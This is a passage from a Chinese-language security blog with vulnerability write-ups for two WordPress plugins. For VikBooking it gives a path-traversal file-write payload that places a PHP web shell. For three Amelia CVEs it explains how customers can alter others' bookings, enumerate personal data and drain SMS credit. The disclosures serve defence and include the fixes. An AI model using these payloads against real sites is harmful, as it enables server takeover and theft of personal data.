(strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; &#125; $ret_link = JRoute::rewrite('index.php?option=com_vikbooking&amp;task=signature&amp;sid='.$row['sid'].'&amp;ts='.$row['ts'].(!empty($pitemid) ? '&amp;Itemid='.$pitemid : '').($ptmpl == 'component' ? '&amp;tmpl=component' : ''), false); if (empty($signature_data)) &#123; VikError::raiseWarning('', JText::translate('VBOSIGNATUREISEMPTY')); $mainframe->redirect($ret_link); exit; &#125; $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; $filepath = VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . 'resources' . DIRECTORY_SEPARATOR . 'idscans' . DIRECTORY_SEPARATOR . $sign_fname; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, $signature_data); fclose($fp); 從最後一段可以看出寫入檔案的內容為 $signature_data，路徑為 VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . &#39;resources&#39; . DIRECTORY_SEPARATOR . &#39;idscans&#39; . DIRECTORY_SEPARATOR . $sign_fname，如果我們可以控制 $signature_data 跟 $sign_fname，就有了一個任意寫檔的漏洞，這些變數的值如下： if (strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; 一個正常的 $psignature 大概是長這樣：data:image/png;base64,image_content。 這邊先檢查 $psignature 有沒有指定的 content type，有的話用 ;base64, 去做字串切割，切完的 parts 會變成： parts[0] = 'data:image/png'; parts[1] = image_content; 然後再把 parts[0] 用 image/ 來切，拿到的第二段資料（以上面的例子來說，會拿到 png）就是 content type，而 parts[1] 則是直接做 base64 decode 後做為檔案內容寫入。 檔名 $sign_fname 的部分則是一些 id 最後加上剛剛得出的 content type。 從上面的邏輯可看出檔案內容基本上可以隨意控制，而檔名的部分也可以輕鬆繞過檢查，像這樣： image&#x2F;png&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php;base64,web_shell 有包含 image/png 所以檢查會過，切完之後 parts[0] 變成 image/png/../../../../shell.php，最後拿到的 content type 為 png/../../../../shell.php，拼接完的檔名會像這樣：id_sid_cid.png/../../../../shell.php，雖然說這檔名看起來很不合理，是檔案之後再接 ../，不過這在 PHP 中是沒問題的，可以看以下範例： &lt;?php $filepath = 'not_exist.php/../poc.php'; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, 'abc'); fclose($fp); ?> 像上面這樣的程式碼，最後還是會把內容寫入同個目錄底下的 poc.php。 有了任意寫檔的漏洞以後，寫入一個 web shell 就 RCE 了，結果像是這樣： 修復方式Vikbooking 在 1.5.4 版修復了這個漏洞，把拿出資料以及 content type 的程式碼改為下面這一段： if (!empty($psignature)) &#123; /** * Implemented safe filtering of base64-encoded signature image * to obtain content and file extension. * * @since 1.15.1 (J) - 1.5.4 (WP) */ if (preg_match(\"/^data:image\\/(png|jpe?g|svg);base64,([A-Za-z0-9\\/=+]+)$/\", $psignature, $safe_match)) &#123; $signature_data = base64_decode($safe_match[2]); $cont_type = $safe_match[1]; &#125; &#125; 這邊改用正則來處理以後，確保了 match 到的 content type 只會是圖片的副檔名，在沒辦法控制檔名中其他參數的狀況下，就無法寫檔案到任意位置了。 結語只能說在做這種讓使用者上傳檔案的功能時都必須特別小心，這種功能特別容易出事，例如說： 檔名沒過濾好，上傳 php 可以 web shell，上傳 HTML 就是 XSS 路徑沒過濾好，可以上傳到任意位置 不知道解壓縮時有可能會碰到 zip slip 總之呢，未來在實作類似功能時記得特別注意這些問題，避免寫出有漏洞的程式碼。","link":"/2022/05/20/wordpress-plugin-vikbooking-unauth-rce/"},{"title":"WordPress Plugin Amelia < 1.0.49 敏感資訊洩露漏洞細節","text":"Amelia 是一個由 TMS 公司所開發的 WordPress 外掛，能夠輕鬆幫你的 WordPress 網站加上預約系統的功能，例如說診所、理髮廳或是家教等等，都很適合使用這個外掛來架一個簡單的預約系統。根據 WordPress 官方的統計，大約有 40,000 個網站都安裝了這個 plugin。 在三月初的時候我針對 Amelia 這套系統的原始碼做了一些研究，找到了三個都是敏感資訊洩露的漏洞： CVE-2022-0720 Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data Disclosure (CVSS 6.3) CVE-2022-0825 Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status Update (CVSS 6.3) CVE-2022-0837 Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data Disclosure (CVSS 5.4) 如果被攻擊者利用這些漏洞，可以取得所有消費者的資料，包括姓名、電話以及預約資訊。 底下我會簡單介紹一下 Amelia 的架構以及這三個漏洞的細節。 Amelia 基本介紹安裝好 Amelia 以後，你可以新增一個預約頁面，大概是長這樣： 在預約時需要提供一些基本資料，例如說姓名以及 email 等等，輸入後即可完成預約： 完成預約以後，Amelia 會幫你在 WordPress 系統裡面新增一個低權限的帳號，並且把重設密碼的連結寄到剛剛提供的信箱。帳號開通以後，就可以登入 WordPress 管理剛剛的預約： 使用方式介紹完以後，我們來看一下更技術的部分。 WordPress 外掛與 Amelia 架構介紹WordPress 的外掛有很多，每一個的寫法都不太一樣，但因為是外掛，所以會呼叫 WordPress 提供的函式來註冊事件。 add_action 這個函式就扮演著很重要的角色，你可以幫特定的 action 加上一個 hook，當這個 action 被觸發時，就會呼叫到你提供的函式。 其中由 wp_ajax_nopriv_ 開頭的 action，可以透過 wp-admin/admin-ajax.php 來呼叫，相關程式碼節錄如下（admin-ajax.php）： &lt;?php $action = $_REQUEST['action']; if ( is_user_logged_in() ) &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires authenticated Ajax actions for logged-in users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.1.0 */ do_action( \"wp_ajax_&#123;$action&#125;\" ); &#125; else &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires non-authenticated Ajax actions for logged-out users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.8.0 */ do_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ); &#125; ?> 以 Amelia 來說，在 ameliabooking.php 中註冊了兩個 hook： /** Isolate API calls */ add_action('wp_ajax_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); add_action('wp_ajax_nopriv_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); 有 nopriv 的代表沒有權限（未登入）也可以呼叫，沒有的代表需要登入 WordPress 系統才能呼叫，而許多的 plugin 會選擇自己處理身份驗證相關的邏輯，所以會把兩個動作都導到同一個地方。 而 wpAmeliaApiCall 這個函式則是註冊了 routes： /** * API Call * * @throws \\InvalidArgumentException */ public static function wpAmeliaApiCall() &#123; try &#123; /** @var Container $container */ $container = require AMELIA_PATH . '/src/Infrastructure/ContainerConfig/container.php'; $app = new App($container); // Initialize all API routes Routes::routes($app); $app->run(); exit(); &#125; catch (Exception $e) &#123; echo 'ERROR: ' . $e->getMessage(); &#125; &#125; 在 src/Infrastructure/Routes 底下有許多的資料夾跟檔案，裡面負責處理不同的路由，舉例來說，User 相關的路由在 src/Infrastructure/Routes/User/User.php，相關程式碼節錄如下： /** * Class User * * @package AmeliaBooking\\Infrastructure\\Routes\\User */ class User &#123; /** * @param App $app */ public static function routes(App $app) &#123; $app->get('/users/wp-users', GetWPUsersController::class); $app->post('/users/authenticate', LoginCabinetController::class); $app->post('/users/logout', LogoutCabinetController::class); // Customers $app->get('/users/customers/&#123;id:[0-9]+&#125;', GetCustomerController::class); $app->get('/users/customers', GetCustomersController::class); $app->post('/users/customers', AddCustomerController::class); $app->post('/users/customers/&#123;id:[0-9]+&#125;', UpdateCustomerController::class); $app->post('/users/customers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/customers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); $app->post('/users/customers/reauthorize', ReauthorizeController::class); // Providers $app->get('/users/providers/&#123;id:[0-9]+&#125;', GetProviderController::class); $app->get('/users/providers', GetProvidersController::class); $app->post('/users/providers', AddProviderController::class); $app->post('/users/providers/&#123;id:[0-9]+&#125;', UpdateProviderController::class); $app->post('/users/providers/status/&#123;id:[0-9]+&#125;', UpdateProviderStatusController::class); $app->post('/users/providers/delete/&#123;id:[0-9]+&#125;', DeleteUserController::class); $app->get('/users/providers/effect/&#123;id:[0-9]+&#125;', GetUserDeleteEffectController::class); // Current User $app->get('/users/current', GetCurrentUserController::class); &#125; &#125; 那實際上到底要怎麼呼叫到這些路由呢？在 src/Infrastructure/ContainerConfig/request.php 中，針對 request 的 query string 做了一些轉換： &lt;?php use Slim\\Http\\Request; use Slim\\Http\\Uri; $entries['request'] = function (AmeliaBooking\\Infrastructure\\Common\\Container $c) &#123; $curUri = Uri::createFromEnvironment($c->get('environment')); // 附註：AMELIA_ACTION_SLUG = \"action=wpamelia_api&amp;call=\" $newRoute = str_replace( ['XDEBUG_SESSION_START=PHPSTORM&amp;' . AMELIA_ACTION_SLUG, AMELIA_ACTION_SLUG], '', $curUri->getQuery() ); $newPath = strpos($newRoute, '&amp;') ? substr( $newRoute, 0, strpos($newRoute, '&amp;') ) : $newRoute; $newQuery = strpos($newRoute, '&amp;') ? substr( $newRoute, strpos($newRoute, '&amp;') + 1 ) : ''; $request = Request::createFromEnvironment($c->get('environment')) ->withUri( $curUri ->withPath($newPath) ->withQuery($newQuery) ); if (method_exists($request, 'getParam') &amp;&amp; $request->getParam('showAmeliaErrors')) &#123; ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); &#125; return $request; &#125;; 簡單來說呢，當你的 request URL 長這樣的時候：/wordpress/wp-admin/admin-ajax.php?action=wpamelia_api&amp;call=/users/wp-users，query string 就是 action=wpamelia_api&amp;call=/users/wp-users，符合 AMELIA_ACTION_SLUG 的地方被換成空白之後，就變成了 /users/wp-users，就對應到了上面的檔案看到的路由，重新交由 Slim 這個 PHP 框架去處理。 而 /users/wp-users 對應到的是 GetWPUsersController::class，讓我們來看一下 controller 的程式碼： &lt;?php namespace AmeliaBooking\\Application\\Controller\\User; use AmeliaBooking\\Application\\Commands\\User\\GetWPUsersCommand; use AmeliaBooking\\Application\\Controller\\Controller; use Slim\\Http\\Request; /** * Class GetWPUsersController * * @package AmeliaBooking\\Application\\Controller\\User */ class GetWPUsersController extends Controller &#123; /** * Instantiates the Get WP Users command to hand it over to the Command Handler * * @param Request $request * @param $args * * @return GetWPUsersCommand * @throws \\RuntimeException */ protected function instantiateCommand(Request $request, $args) &#123; $command = new GetWPUsersCommand($args); $command->setField('id', (int)$request->getQueryParam('id')); $command->setField('role', $request->getQueryParam('role')); $requestBody = $request->getParsedBody(); $this->setCommandFields($command, $requestBody); return $command; &#125; &#125; 這邊使用了設計模式中的 Command Pattern，把每一個動作都包裝成一個指令，那這個指令會被誰處理呢？每一個 controller 都繼承了 AmeliaBooking\\Application\\Controller\\Controller，所以處理的程式碼就在裡面： /** * @param Request $request * @param Response $response * @param $args * * @return Response * @throws \\InvalidArgumentException * @throws \\RuntimeException */ public function __invoke(Request $request, Response $response, $args) &#123; /** @var Command $command */ $command = $this->instantiateCommand($request, $args); if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; /** @var CommandResult $commandResult */ $commandResult = $this->commandBus->handle($command); if ($commandResult->getUrl() !== null) &#123; $this->emitSuccessEvent($this->eventBus, $commandResult); /** @var Response $response */ $response = $response->withHeader('Location', $commandResult->getUrl()); $response = $response->withStatus(self::STATUS_REDIRECT); return $response; &#125; if ($commandResult->hasAttachment() === false) &#123; $responseBody = [ 'message' => $commandResult->getMessage(), 'data' => $commandResult->getData() ]; $this->emitSuccessEvent($this->eventBus, $commandResult); switch ($commandResult->getResult()) &#123; case (CommandResult::RESULT_SUCCESS): $response = $response->withStatus(self::STATUS_OK); break; case (CommandResult::RESULT_CONFLICT): $response = $response->withStatus(self::STATUS_CONFLICT); break; default: $response = $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); break; &#125; /** @var Response $response */ $response = $response->withHeader('Content-Type', 'application/json;charset=utf-8'); $response = $response->write( json_encode( $commandResult->hasDataInResponse() ? $responseBody : array_merge($responseBody, ['data' => []]) ) ); &#125; return $response; &#125; 這邊先實例化一個指令之後，再丟到 commandBus 去做處理：$this-&gt;commandBus-&gt;handle($command)，程式碼在 src/Infrastructure/ContainerConfig/command.bus.php，節錄部分： &lt;?php defined('ABSPATH') or die('No script kiddies please!'); // @codingStandardsIgnoreStart $entries['command.bus'] = function ($c) &#123; $commands = [ // User User\\DeleteUserCommand::class => new User\\DeleteUserCommandHandler($c), User\\GetCurrentUserCommand::class => new User\\GetCurrentUserCommandHandler($c), User\\GetUserDeleteEffectCommand::class => new User\\GetUserDeleteEffectCommandHandler($c), User\\GetWPUsersCommand::class => new User\\GetWPUsersCommandHandler($c), // more commands... ]; return League\\Tactician\\Setup\\QuickStart::create($commands); &#125;; // @codingStandardsIgnoreEnd 從中可以看出我們的 GetWPUsersCommand 會被 User\\GetWPUsersCommandHandler 處理，所以主要的邏輯就在這裡面： class GetWPUsersCommandHandler extends CommandHandler &#123; /** * @param GetWPUsersCommand $command * * @return CommandResult * @throws AccessDeniedException * @throws InvalidArgumentException * @throws \\AmeliaBooking\\Infrastructure\\Common\\Exceptions\\QueryExecutionException * @throws \\Interop\\Container\\Exception\\ContainerException */ public function handle(GetWPUsersCommand $command) &#123; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::EMPLOYEES)) &#123; throw new AccessDeniedException('You are not allowed to read employees.'); &#125; if (!$this->getContainer()->getPermissionsService()->currentUserCanRead(Entities::CUSTOMERS)) &#123; throw new AccessDeniedException('You are not allowed to read customers.'); &#125; $result = new CommandResult(); $this->checkMandatoryFields($command); /** @var UserService $userService */ $userService = $this->container->get('users.service'); $adminIds = $userService->getWpUserIdsByRoles(['administrator']); /** @var WPUserRepository $wpUserRepository */ $wpUserRepository = $this->getContainer()->get('domain.wpUsers.repository'); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Successfully retrieved users.'); $result->setData([ Entities::USER . 's' => $wpUserRepository->getAllNonRelatedWPUsers($command->getFields(), $adminIds) ]); return $result; &#125; &#125; 可以看到業務邏輯都在 handle 這個函式裡面，裡面先檢查了權限，接著透過 userService 抓取相關資料，再來用 $result-&gt;setData 設置要回傳的資料，最後回傳結果，交給其他 infra 相關程式碼處理。 另外，在 controller 中可以看到 command 相關的權限檢查： if (!wp_verify_nonce($command->getField('ameliaNonce'), 'ajax-nonce') &amp;&amp; ( $command instanceof DeleteUserCommand || $command instanceof DeletePackageCommand || $command instanceof DeleteCategoryCommand || $command instanceof DeleteServiceCommand || $command instanceof DeleteExtraCommand || $command instanceof DeleteLocationCommand || $command instanceof DeleteEventCommand || $command instanceof DeletePaymentCommand || $command instanceof DeleteCouponCommand || $command instanceof DeleteCustomFieldCommand || $command instanceof DeleteAppointmentCommand || $command instanceof DeleteBookingCommand || $command instanceof DeleteEventBookingCommand || $command instanceof DeletePackageCustomerCommand || $command instanceof DeleteNotificationCommand ) ) &#123; return $response->withStatus(self::STATUS_INTERNAL_SERVER_ERROR); &#125; 如果是這些 delete 的指令，就需要通過 wp_verify_nonce 的檢查，這是什麼東西呢？ wp_verify_nonce 是 WordPress 提供用於安全性檢查的函式，對應的函式是 wp_create_nonce，在 WordPress 後台管理頁面有這樣一行程式碼：var wpAmeliaNonce = &#39;&lt;?php echo wp_create_nonce(&#39;ajax-nonce&#39;); ?&gt;&#39;;，會產生一個名稱為 ajax-nonce 的 nonce，而這個 nonce 其實就是把一些字串 hash 過後的結果。 如果你拿不到 hash 時用的 salt，基本上不可能偽造出 nonce，因為 salt 預設都非常長，而且都是安裝時隨機產生的： define('AUTH_KEY', ' Xakm&lt;o xQy rw4EMsLKM-?!T+,PFF&#125;)H4lzcW57AF0U@N@&lt; >M%G4Yt>f`z]MON'); define('SECURE_AUTH_KEY', 'LzJ&#125;op]mr|6+![P&#125;Ak:uNdJCJZd>(Hx.-Mh#Tz)pCIU#uGEnfFz|f ;;eU%/U^O~'); define('LOGGED_IN_KEY', '|i|Ux`9&lt;p-h$aFf(qnT:sDO:D1P^wZ$$/Ra@miTJi9G;ddp_&lt;q&#125;6H1)o|a +&amp;JCM'); define('NONCE_KEY', '%:R&#123;[P|,s.KuMltH5&#125;cI;/k&lt;Gx~j!f0I)m_sIyu+&amp;NJZ)-iO>z7X>QYR0Z_XnZ@|'); define('AUTH_SALT', 'eZyT)-Naw]F8CwA*VaW#q*|.)g@o&#125;||wf~@C-YSt&#125;(dh_r6EbI#A,y|nU2&#123;B#JBW'); define('SECURE_AUTH_SALT', '!=oLUTXh,QW=H `&#125;`L|9/^4-3 STz&#125;,T(w&#125;W&lt;I`.JjPi)&lt;Bmf1v,HpGe&#125;T1:Xt7n'); define('LOGGED_IN_SALT', '+XSqHc;@Q*K_b|Z?NC[3H!!EONbh.n&lt;+=uKR:>*c(u`g~EJBf#8u#R&#123;mUEZrozmm'); define('NONCE_SALT', 'h`GXHhD>SLWVfg1(1(N&#123;;.V!MoE(SfbA_ksP@&amp;`+AycHcAV$+?@3q+rxV&#123;%^VyKT'); 因此，透過 wp_verify_nonce，我們可以確保只有已登入的使用者能使用到某些功能，因為沒登入的話拿不到 nonce。 以上就是 Amelia 的基本架構跟處理流程，是我看過的幾個 plugin 中最為漂亮的一個，東西都整理得很好，架構也切得不錯，不會出現一堆雜七雜八的程式碼，要找東西也很好找，只要去 routes 看一下網址跟對應的 controller，循線找到 command 跟 command handler 即可。 接著，就來談談開頭提到的那三個漏洞。 CVE-2022-0720: Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data Disclosure管理訂房相關的模組有兩個，一個叫做 Appointment，另一個叫做 Booking，他們是一對多的關係，一個 Appointment 底下可以對應到多個 Booking，相關路由如下： src/Infrastructure/Routes/Booking/Appointment/Appointment.php class Appointment &#123; /** * @param App $app * * @throws \\InvalidArgumentException */ public static function routes(App $app) &#123; $app->get('/appointments', GetAppointmentsController::class); $app->get('/appointments/&#123;id:[0-9]+&#125;', GetAppointmentController::class); $app->post('/appointments', AddAppointmentController::class); $app->post('/appointments/delete/&#123;id:[0-9]+&#125;', DeleteAppointmentController::class); $app->post('/appointments/&#123;id:[0-9]+&#125;', UpdateAppointmentController::class); $app->post('/appointments/status/&#123;id:[0-9]+&#125;', UpdateAppointmentStatusController::class); $app->post('/appointments/time/&#123;id:[0-9]+&#125;', UpdateAppointmentTimeController::class); &#125; &#125; 以顯示 appointment 的路由 /appointments/&#123;id:[0-9]+&#125; 為例，對應到 GetAppointmentController，在 controller 中會去呼叫 GetAppointmentCommandHandler，裡面有段程式碼是這樣的： $customerAS->removeBookingsForOtherCustomers($user, new Collection([$appointment])); 在回傳資料前，會把不屬於自己的 booking 全部都過濾掉，所以看不到其他人的資料，有做好權限管理。 而更新 appointment 的路由對應到的 controller 是 UpdateAppointmentController，又對應到了 UpdateAppointmentCommandHandler.php，部分程式碼如下： try &#123; /** @var AbstractUser $user */ $user = $userAS->authorization( $command->getPage() === 'cabinet' ? $command->getToken() : null, $command->getCabinetType() ); &#125; catch (AuthorizationException $e) &#123; $result->setResult(CommandResult::RESULT_ERROR); $result->setData( [ 'reauthorize' => true ] ); return $result; &#125; if ($userAS->isProvider($user) &amp;&amp; !$settingsDS->getSetting('roles', 'allowWriteAppointments')) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; // update appointment 開頭有檢查了兩樣東西，第一樣是使用者是否登入，所以儘管沒有 nonce 也可以進來這個路由，在這邊還是會被擋下來。第二樣則是使用者的身份，如果是 provider 才會檢查有沒有權限。 在 Amelia 中基本上有幾個角色，消費者（Customer)、服務提供者（Provider）以及管理員（Admin），所以只要我們不是 provider，就可以通過這邊的檢查。 開頭有提過只要透過 Amelia 的外掛隨便預約一個服務，就可以在 WordPress 的系統中註冊一個 customer 的帳號，這組帳號可以登入 WordPress，來管理自己之前的預約。 因此，這邊的權限檢查是有漏洞的，一個 customer 身份的使用者可以通過這邊的檢查，去竄改其他人的預約。雖然看起來好像很普通，但其實使用者在前台修改自己的預約時，用的是另外一個 /bookings/&#123;id&#125; 的 API，這個 appointment 的 API 我猜預設是給 provider 使用的，所以才沒考慮到 customer 的狀況。 那除了修改 booking 以外，還可以幹嘛呢？我們來看一下更新完的 response： 我們可以看到 response 中有個 info 欄位，裡面有原本消費者的個人資料，包括姓名以及電話等等，這個欄位是在 src/Application/Services/Reservation/AbstractReservationService.php 中的 processBooking 時儲存的： $appointmentData['bookings'][0]['info'] = json_encode( [ 'firstName' => $appointmentData['bookings'][0]['customer']['firstName'], 'lastName' => $appointmentData['bookings'][0]['customer']['lastName'], 'phone' => $appointmentData['bookings'][0]['customer']['phone'], 'locale' => $appointmentData['locale'], 'timeZone' => $appointmentData['timeZone'], 'urlParams' => !empty($appointmentData['urlParams']) ? $appointmentData['urlParams'] : null, ] ); 總結一下，因為權限檢查沒做好，所以 customer 可以更新其他人的預約，並且看到消費者的個人資料，而 appointment 的 ID 是流水號，所以直接列舉一下，就可以把系統中所有人的個資都撈出來。 修復方式在 1.0.47 版中，有做出了兩個變動，第一個是針對我回報的問題，加上了對於 customer 的權限檢查： if ($userAS->isCustomer($user)) &#123; throw new AccessDeniedException('You are not allowed to update appointment'); &#125; 第二個改動則是 routes 的權限檢查，從負面表列變成正面表列，只有幾個特定的 command 不需登入： public function validateNonce($request) &#123; if ($request->getMethod() === 'POST' &amp;&amp; !self::getToken() &amp;&amp; !($this instanceof LoginCabinetCommand) &amp;&amp; !($this instanceof AddBookingCommand) &amp;&amp; !($this instanceof AddStatsCommand) &amp;&amp; !($this instanceof MolliePaymentCommand) &amp;&amp; !($this instanceof MolliePaymentNotifyCommand) &amp;&amp; !($this instanceof PayPalPaymentCommand) &amp;&amp; !($this instanceof PayPalPaymentCallbackCommand) &amp;&amp; !($this instanceof RazorpayPaymentCommand) &amp;&amp; !($this instanceof WooCommercePaymentCommand) &amp;&amp; !($this instanceof SuccessfulBookingCommand) ) &#123; return wp_verify_nonce($request->getQueryParams()['ameliaNonce'], 'ajax-nonce'); &#125; return true; &#125; CVE-2022-0825: Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status Update這個漏洞跟上一個類似，都是屬於權限管理的問題，而這個漏洞的路由是 $app-&gt;post(&#39;/appointments/status/&#123;id:[0-9]+&#125;&#39;, UpdateAppointmentStatusController::class);，對應到的程式碼在 src/Application/Commands/Booking/Appointment/UpdateAppointmentStatusCommandHandler.php，開頭有先做權限檢查： if (!$this->getContainer()->getPermissionsService()->currentUserCanWriteStatus(Entities::APPOINTMENTS)) &#123; throw new AccessDeniedException('You are not allowed to update appointment status'); &#125; // update appointment 我們繼續往下追，去看看 currentUserCanWriteStatus 是怎麼實作的： public function currentUserCanWriteStatus($object) &#123; return $this->userCan($this->currentUser, $object, self::WRITE_STATUS_PERMISSIONS); &#125; 再往下追，找到 userCan： public function userCan($user, $object, $permission) &#123; if ($user instanceof Admin) &#123; return true; &#125; return $this->permissionsChecker->checkPermissions($user, $object, $permission); &#125; 再往下一層，在 src/Infrastructure/WP/PermissionsService/PermissionsChecker.php 中可以看到 checkPermissions 的實作： public function checkPermissions($user, $object, $permission) &#123; // Admin can do all if ($user instanceof Admin) &#123; return true; &#125; // Get the WP role name of the user, rollback to customer by default $wpRoleName = $user !== null ? 'wpamelia-' . $user->getType() : 'wpamelia-customer'; // Get the wp name of capability we are looking for. $wpCapability = \"amelia_&#123;$permission&#125;_&#123;$object&#125;\"; if ($user !== null &amp;&amp; $user->getExternalId() !== null) &#123; return user_can($user->getExternalId()->getValue(), $wpCapability); &#125; // If user is guest check does it have capability $wpRole = get_role($wpRoleName); return $wpRole !== null &amp;&amp; isset($wpRole->capabilities[$wpCapability]) ? (bool)$wpRole->capabilities[$wpCapability] : false; &#125; 這邊有個值得注意的地方，就是如果 user 是 null 的話，會被當成 customer 來看待，而實際檢查有沒有權限要看 capabilities 這個 table，在 src/Infrastructure/WP/config/Roles.php： // Customer [ 'name' => 'wpamelia-customer', 'label' => __('Amelia Customer', 'amelia'), 'capabilities' => [ 'read' => true, 'amelia_read_menu' => true, 'amelia_read_calendar' => true, 'amelia_read_appointments' => true, 'amelia_read_events' => true, 'amelia_write_status_appointments' => true, 'amelia_write_time_appointments' => true, ] ], 其中 amelia_write_status_appointments 是 true，代表 customer 有權限更新狀態。 剩下的部分就跟上一個漏洞一樣了，更新 appointment 之後資料會整包回傳，透過 info 這個欄位可以看到消費者的個人資料。另外，這個漏洞在 1.0.47 以前會是 pre-auth 的，因為 1.0.47 以前 routes 的權限檢查還沒變成正面表列，所以沒登入也可以存取到這個指令，再加上 user 是 null 的話預設是消費者身份，完成了整條攻擊鏈的串接： 修復方式在 1.0.49 版中，移除了 customer 的 amelia_write_status_appointments 這個權限。 CVE-2022-0837: Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data Disclosure來看最後一個權限檢查相關漏洞，出問題的路由是 $app-&gt;post(&#39;/notifications/sms&#39;, SendAmeliaSmsApiRequestController::class);，對應到的是 SendAmeliaSmsApiRequestCommandHandler： public function handle(SendAmeliaSmsApiRequestCommand $command) &#123; $result = new CommandResult(); /** @var SMSAPIServiceInterface $smsApiService */ $smsApiService = $this->getContainer()->get('application.smsApi.service'); // Call method dynamically and pass data to the function. Method name is the request field. $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); $result->setResult(CommandResult::RESULT_SUCCESS); $result->setMessage('Amelia SMS API request successful'); $result->setData($apiResponse); return $result; &#125; 可以看到這邊沒有做任何的權限檢查，而我們可以控制傳到這邊的參數： $apiResponse = $smsApiService->&#123;$command->getField('action')&#125;($command->getField('data')); 在 smsApiService 中有不少方法，而其中只有一個參數的包括可以拿到管理員個人資訊的 getUserInfo，可以拿到付款紀錄的 getPaymentHistory，以及可以發送測試簡訊的 testNotification： public function getUserInfo() &#123; $route = 'auth/info'; return $this->sendRequest($route, true); &#125; public function getPaymentHistory($data) &#123; $route = '/payment/history'; return $this->sendRequest($route, true, $data); &#125; public function testNotification($data) &#123; $route = '/sms/send'; /** @var SettingsService $settingsService */ $settingsService = $this->container->get('domain.settings.service'); /** @var EmailNotificationService $notificationService */ $notificationService = $this->container->get('application.emailNotification.service'); /** @var PlaceholderService $placeholderService */ $placeholderService = $this->container->get(\"application.placeholder.&#123;$data['type']&#125;.service\"); $appointmentsSettings = $settingsService->getCategorySettings('appointments'); $notification = $notificationService->getById($data['notificationTemplate']); $dummyData = $placeholderService->getPlaceholdersDummyData('sms'); $isForCustomer = $notification->getSendTo()->getValue() === NotificationSendTo::CUSTOMER; $placeholderStringRec = 'recurring' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $placeholderStringPack = 'package' . 'Placeholders' . ($isForCustomer ? 'Customer' : '') . 'Sms'; $dummyData['recurring_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringRec], $dummyData); $dummyData['package_appointments_details'] = $placeholderService->applyPlaceholders($appointmentsSettings[$placeholderStringPack], $dummyData); $body = $placeholderService->applyPlaceholders( $notification->getContent()->getValue(), $dummyData ); $data = [ 'to' => $data['recipientPhone'], 'from' => $settingsService->getSetting('notifications', 'smsAlphaSenderId'), 'body' => $body ]; return $this->sendRequest($route, true, $data); &#125; 實際測試截圖： 發送測試簡訊： 發送測試簡訊也是要扣錢的，我們只要一直打這個 endpoint，就會一直發送測試簡訊然後一直扣款，可以利用這個漏洞把管理員的錢燒光。 修復方式在 1.0.48 版中，於 controller 內加上了權限檢查： if (!$this->getContainer()->getPermissionsService()->currentUserCanWrite(Entities::NOTIFICATIONS)) &#123; throw new AccessDeniedException('You are not allowed to send test email'); &#125; 總結當開發的軟體變得愈來愈複雜，開發者往往容易忽略一些基本的權限檢查，以及對於權限有著錯誤的假設。舉例來說，雖然 appointment 相關的 API 是給 provider 用的，前端的消費者看不到這些 API，但是 WordPress 外掛的程式碼都是開放的，任何人只要看了程式碼，都能找出所有的 API 路徑。 在實作各種功能時，要記得把權限檢查放在第一位，確認當前的使用者對於欲操作的資源有權限以後，才繼續後面的流程。 最後附上時間軸： 2022-02-20 透過 WPScan 回報更新預約漏洞，保留 